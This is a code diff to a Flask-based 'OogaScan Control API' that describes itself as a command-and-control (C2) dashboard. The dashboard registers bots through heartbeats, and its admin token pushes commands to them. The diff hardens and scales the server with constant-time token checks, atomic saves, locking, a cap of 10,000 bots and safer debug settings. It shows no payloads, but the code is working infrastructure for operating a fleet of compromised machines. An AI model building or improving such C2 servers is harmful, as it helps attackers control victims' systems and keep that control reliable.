@@ -3,7 +3,7 @@
 OogaScan Control API — REST interface for the C2 dashboard.
 
 Two roles:
-  - admin: Full C2 control (push commands, manage repos, tokens, heartbeat, deploy)
+  - admin: Full C2 control (push commands, manage repos, tokens, heartbeat)
   - lints: Read-only monitoring (view bots, repos, commands, status)
 
 Auth via Bearer token in Authorization header.
@@ -13,6 +13,7 @@ import os
 import sys
 import json
 import time
+import hmac
 import hashlib
 import secrets
 import threading
@@ -20,7 +21,7 @@ from pathlib import Path
 from functools import wraps
 from dataclasses import dataclass, field, asdict
 
-from flask import Flask, request, jsonify, abort
+from flask import Flask, request, jsonify, abort, g
 
 import zwenc
 from control import (
@@ -60,11 +61,17 @@ class APIConfig:
         return cls(**{k: v for k, v in raw.items() if k in cls.__dataclass_fields__})
 
 
-api_config = APIConfig.load()
-control_config = ControlConfig.load()
+api_config: APIConfig | None = None
+control_config: ControlConfig | None = None
+_initialized = False
 
 _bots_lock = threading.Lock()
 _bots: dict[str, dict] = {}
+_bots_last_save: float = 0.0
+_BOTS_SAVE_INTERVAL = 10
+_MAX_BOTS = 10_000
+
+_config_lock = threading.Lock()
 
 
 def _load_bots():
@@ -78,12 +85,51 @@ def _load_bots():
 
 def _save_bots():
     try:
-        Path(BOTS_FILE).write_text(json.dumps(_bots, indent=2))
+        with _bots_lock:
+            data = json.dumps(_bots, indent=2)
+        tmp = BOTS_FILE + ".tmp"
+        Path(tmp).write_text(data)
+        os.replace(tmp, BOTS_FILE)
     except OSError:
         pass
 
 
-_load_bots()
+def _save_bots_throttled():
+    global _bots_last_save
+    now = time.time()
+    if now - _bots_last_save >= _BOTS_SAVE_INTERVAL:
+        _save_bots()
+        _bots_last_save = now
+
+
+def _init_app():
+    global api_config, control_config, _initialized
+    if _initialized:
+        return
+    api_config = APIConfig.load()
+    control_config = ControlConfig.load()
+    _load_bots()
+    _initialized = True
+
+
+@app.before_request
+def _ensure_initialized():
+    _init_app()
+
+
+@app.before_request
+def _acquire_config_lock():
+    if request.endpoint == 'heartbeat_receiver':
+        g._holds_config_lock = False
+        return
+    _config_lock.acquire()
+    g._holds_config_lock = True
+
+
+@app.teardown_request
+def _release_config_lock(exc=None):
+    if getattr(g, '_holds_config_lock', False):
+        _config_lock.release()
 
 
 def _get_role():
@@ -91,9 +137,9 @@ def _get_role():
     if not auth.startswith("Bearer "):
         return None
     token = auth[7:]
-    if token == api_config.admin_token:
+    if hmac.compare_digest(token, api_config.admin_token):
         return "admin"
-    if token == api_config.lints_token:
+    if hmac.compare_digest(token, api_config.lints_token):
         return "lints"
     return None
 
@@ -362,11 +408,11 @@ def admin_list_bots():
 @require_admin
 def admin_remove_bot(bot_id):
     with _bots_lock:
-        if bot_id in _bots:
-            del _bots[bot_id]
-            _save_bots()
-            return jsonify({"removed": bot_id})
-    return jsonify({"error": "Bot not found"}), 404
+        if bot_id not in _bots:
+            return jsonify({"error": "Bot not found"}), 404
+        del _bots[bot_id]
+    _save_bots()
+    return jsonify({"removed": bot_id})
 
 
 @app.route("/api/admin/stats", methods=["GET"])
@@ -452,6 +498,9 @@ def heartbeat_receiver(bot_hash):
 
     with _bots_lock:
         if bot_hash not in _bots:
+            if len(_bots) >= _MAX_BOTS:
+                oldest = min(_bots, key=lambda k: _bots[k].get("last_seen", 0))
+                del _bots[oldest]
             _bots[bot_hash] = {
                 "ip": ip,
                 "first_seen": now,
@@ -462,7 +511,8 @@ def heartbeat_receiver(bot_hash):
             _bots[bot_hash]["last_seen"] = now
             _bots[bot_hash]["hits"] += 1
             _bots[bot_hash]["ip"] = ip
-        _save_bots()
+
+    _save_bots_throttled()
 
     return "", 204
 
@@ -501,6 +551,9 @@ def handle_500(e):
 
 def main():
     import argparse
+
+    _init_app()
+
     parser = argparse.ArgumentParser(description="OogaScan Control API")
     parser.add_argument("-H", "--host", default=api_config.host)
     parser.add_argument("-p", "--port", type=int, default=api_config.port)
@@ -518,6 +571,11 @@ def main():
         print(f"  Lints: {api_config.lints_token}")
         return
 
+    if args.debug and args.host != "127.0.0.1":
+        print(f"  WARNING: Debug mode with network-accessible host exposes Werkzeug debugger.")
+        print(f"  Restricting to 127.0.0.1 for safety.")
+        args.host = "127.0.0.1"
+
     print(f"""
   ╔══════════════════════════════════════════════╗
   ║  OogaScan Control API                        ║
@@ -527,6 +585,8 @@ def main():
   Host: {args.host}:{args.port}
   Admin token: {api_config.admin_token[:8]}...
   Lints token: {api_config.lints_token[:8]}...
+  WARNING: Running on plain HTTP — tokens are transmitted in cleartext.
+           Use a TLS reverse proxy for production deployments.
 
   Endpoints:
     /api/admin/*       Full C2 control (admin token)
